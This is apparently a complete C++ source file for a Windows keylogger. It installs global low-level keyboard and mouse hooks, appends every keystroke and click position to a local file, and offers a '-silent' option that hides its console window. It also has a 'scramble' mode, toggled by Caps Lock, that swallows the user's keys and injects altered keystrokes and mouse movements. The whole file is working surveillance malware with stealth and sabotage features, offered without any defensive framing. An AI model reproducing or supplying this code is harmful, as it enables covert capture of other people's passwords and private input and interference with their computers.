#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

HINSTANCE hInstance = GetModuleHandle(NULL);

HHOOK mouseHook;
HHOOK keyboardHook;

BOOL scramble = FALSE;

ofstream file;

LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PMOUSEHOOKSTRUCT p = (PMOUSEHOOKSTRUCT)lParam;
	if (wParam == WM_LBUTTONDOWN && nCode >= 0)
	{
		file << "Left Button was clicked at position x: " << p->pt.x << " y: " << p->pt.y << endl;
		if (scramble && p->dwExtraInfo != 1)
		{
			INPUT in = { 0 };
			in.type = INPUT_MOUSE;
			in.mi.dx = -200;
			in.mi.dy = -200;
			in.mi.dwExtraInfo = 1;
			in.mi.dwFlags = MOUSEEVENTF_MOVE;

			SendInput(1, &in, sizeof(in));
		}
	}
	if (wParam == WM_RBUTTONDOWN && nCode >= 0)
	{
		file << "Right Button was clicked at position x: " << p->pt.x << " y: " << p->pt.y << endl;
		if (scramble && p->dwExtraInfo != 1)
		{
			INPUT in = { 0 };
			in.type = INPUT_MOUSE;
			in.mi.dx = 200;
			in.mi.dy = 200;
			in.mi.dwExtraInfo = 1;
			in.mi.dwFlags = MOUSEEVENTF_MOVE;

			SendInput(1, &in, sizeof(in));
		}
	}
	
	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

DWORD WINAPI mouseLogger(LPVOID lpParm)
{
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, hInstance, NULL);
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(mouseHook);
	return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN && nCode >= 0)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		if (p->dwExtraInfo == 0)
		{
			switch (p->vkCode)
			{
			case 0x08: file << "BACKSPACE" << endl; break;
			case 0x09: file << "TAB" << endl; break;
			case 0x0D: file << "ENTER" << endl; break;
			case 0x13: file << "PAUSE" << endl; break;
			case 0x14: file << "CAPS LOCK" << endl; scramble ? scramble = FALSE : scramble = TRUE; break;
			case 0x1B: file << "ESC" << endl; break;
			case 0x20: file << "SPACEBAR" << endl; break;
			case 0x21: file << "PAGE UP" << endl; break;
			case 0x22: file << "PAGE DOWN" << endl; break;
			case 0x23: file << "END" << endl; break;
			case 0x24: file << "HOME" << endl; break;
			case 0x25: file << "LEFT ARROW" << endl; break;
			case 0x26: file << "UP ARROW" << endl; break;
			case 0x27: file << "RIGHT ARROW" << endl; break;
			case 0x28: file << "DOWN ARROW" << endl; break;
			case 0x2C: file << "PRINT SCREEN" << endl; break;
			case 0x2D: file << "INS" << endl; break;
			case 0x2E: file << "DEL" << endl; break;
			case 0x5B: file << "LWIN" << endl; break;
			case 0x5C: file << "RWIN" << endl; break;
			case 0x5D: file << "MENU" << endl; break;
			case 0x60: file << "NUM_0" << endl; break;
			case 0x61: file << "NUM_1" << endl; break;
			case 0x62: file << "NUM_2" << endl; break;
			case 0x63: file << "NUM_3" << endl; break;
			case 0x64: file << "NUM_4" << endl; break;
			case 0x65: file << "NUM_5" << endl; break;
			case 0x66: file << "NUM_6" << endl; break;
			case 0x67: file << "NUM_7" << endl; break;
			case 0x68: file << "NUM_8" << endl; break;
			case 0x69: file << "NUM_9" << endl; break;
			case 0x6A: file << "NUM_MULTIPLY" << endl; break;
			case 0x6B: file << "NUM_ADD" << endl; break;
			case 0x6D: file << "NUM_SUBTRACT" << endl; break;
			case 0x6E: file << "NUM_DECIMAL" << endl; break;
			case 0x6F: file << "NUM_DIVIDE" << endl; break;
			case 0x70: file << "F1" << endl; break;
			case 0x71: file << "F2" << endl; break;
			case 0x72: file << "F3" << endl; break;
			case 0x73: file << "F4" << endl; break;
			case 0x74: file << "F5" << endl; break;
			case 0x75: file << "F6" << endl; break;
			case 0x76: file << "F7" << endl; break;
			case 0x77: file << "F8" << endl; break;
			case 0x78: file << "F9" << endl; break;
			case 0x79: file << "F10" << endl; break;
			case 0x7A: file << "F11" << endl; break;
			case 0x7B: file << "F12" << endl; break;
			case 0x90: file << "NUM LOCK" << endl; break;
			case 0x91: file << "SCROLL LOCK" << endl; break;
			case 0xA0: file << "LSHIFT" << endl; break;
			case 0xA1: file << "RSHIFT" << endl; break;
			case 0xA2: file << "LCTRL" << endl; break;
			case 0xA3: file << "RCTRL" << endl; break;
			case 0xA4: file << "LALT" << endl; break;
			case 0xA5: file << "RALT" << endl; break;
			case 0xBA: file << ";" << endl; break;
			case 0xBB: file << "+" << endl; break;
			case 0xBC: file << "," << endl; break;
			case 0xBD: file << "-" << endl; break;
			case 0xBE: file << "." << endl; break;
			case 0xBF: file << "/" << endl; break;
			case 0xC0: file << "~" << endl; break;
			case 0xDB: file << "[" << endl; break;
			case 0xDC: file << "\\" << endl; break;
			case 0xDD: file << "]" << endl; break;
			case 0xDE: file << "'" << endl; break;
			default: file << (char)p->vkCode << endl; break;
			}

			if (scramble && p->vkCode != 0x14)
			{
				INPUT in = { 0 };
				in.type = INPUT_KEYBOARD;
				in.ki.dwExtraInfo = 1;
				in.ki.wVk = p->vkCode + 1;
				in.ki.dwFlags = KEYEVENTF_EXTENDEDKEY;

				SendInput(1, &in, sizeof(in));

				in.type = INPUT_KEYBOARD;
				in.ki.dwExtraInfo = 1;
				in.ki.wVk = p->vkCode + 1;
				in.ki.dwFlags = KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP;

				SendInput(1, &in, sizeof(in));
				
				return 1;
			}
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI keyboardLogger(LPVOID lpParm)
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, NULL);
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(keyboardHook);
	return 0;
}

int main(int argc, char** argv)
{	
	if (argc > 1)
	{
		for (int i = 1; i < argc; i++)
		{
			if (!strcmp(argv[i], "-silent"))
			{
				ShowWindow(GetConsoleWindow(), SW_HIDE);
			}
			if (!strcmp(argv[i], "-scramble"))
			{
				scramble = true;
			}
		}
	}

	file.open("out.txt", ios_base::app);
	if (!file.is_open())
	{
		cout << "Failed to open text file" << endl;
		system("Pause");
		return 0;
	}

	HANDLE hMouseThread;
	DWORD dwMouseThread;

	HANDLE hKeyboardThread;
	DWORD dwKeyboardThread;

	hMouseThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)mouseLogger, NULL, NULL, &dwMouseThread);
	hKeyboardThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)keyboardLogger, NULL, NULL, &dwKeyboardThread);

	if (hMouseThread && hKeyboardThread)
	{
		return WaitForSingleObject(hMouseThread, INFINITE);
	}
	else
	{
		cout << "Failed to create thread" << endl;
	}

	system("Pause");
	return 0;
}